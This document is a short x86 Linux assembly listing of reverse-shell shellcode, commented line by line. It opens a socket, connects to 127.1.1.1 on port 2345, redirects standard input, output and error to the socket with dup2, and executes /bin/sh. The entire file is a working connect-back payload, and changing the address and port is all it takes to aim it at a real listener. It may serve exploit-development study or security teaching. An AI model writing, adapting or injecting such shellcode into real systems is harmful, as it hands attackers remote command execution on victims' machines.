BITS 32

; socket(AF_INET, SOCK_STREAM, IPPROTO_IP); socket(2, 1, 0);
; eax syscall, ebx socketcall, ecx socket argv1, argv2, argv3
push BYTE 102
pop eax
cdq
push dword 1

; socket socketcall num is 1
pop ebx

push edx
push ebx
push BYTE 2
mov ecx, esp

int 0x80

; server_sockfd = socket return
xchg edx, eax

; connect(server_sockfd, (struct*)&server_addr, sizeof(server_addr));
mov al, 0x66

; struct sockaddr_in server_addr;
push DWORD 0x0101017f	; ip 127.1.1.1
push WORD 0x2909	; port 2345
inc ebx
push WORD bx		; AF_INET(2)

mov ecx, esp		; ecx == &server_addr

; connect argv
push BYTE 16		; sizeof(server_addr)
push ecx		; server_addr
push edx		; server_sockfd
mov ecx, esp

; connect socketcall num is 3
inc ebx
int 0x80

; dup2
xchg ebx, edx
push BYTE 0x2
pop ecx
dup2_call:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns dup2_call

; execve("/bin/sh", argv, NULL);
mov al, 11

xor edx, edx
; ebx "/bin/sh", NULL
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
; edx &NULL
push edx
mov edx, esp
; ecx &("/bin/sh", NULL)
push ebx
mov ecx, esp

int 0x80
